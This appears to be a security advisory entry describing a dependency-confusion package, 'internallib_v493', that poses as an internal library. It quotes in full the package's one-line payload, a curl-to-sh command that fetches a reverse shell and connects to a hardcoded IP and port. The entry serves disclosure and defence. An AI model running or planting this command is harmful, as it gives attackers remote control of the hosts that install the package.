summary: Dependency-confusion bait package fetches and executes reverse shell to hardcoded attacker IP
details: The package masquerades as an internal dependency (name `internallib_v493`, empty author, generic `libzona` description) and exposes a single function `command()` whose body executes `/bin/bash -c "curl https://reverse-shell.sh/10.0.74.90:4444|sh"` (index.js line 5). When a consumer requires this package and invokes the exported function, it fetches a reverse-shell script from reverse-shell.sh and pipes it to sh, opening a connection to the hardcoded attacker IP 10.0.74.90 on port 4444 and granting full remote code execution on the installer's host. The combination of internal-namespace-squat naming, empty/placeholder metadata, and a sole export that establishes a reverse shell is an unambiguous dependency-confusion supply-chain attack.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
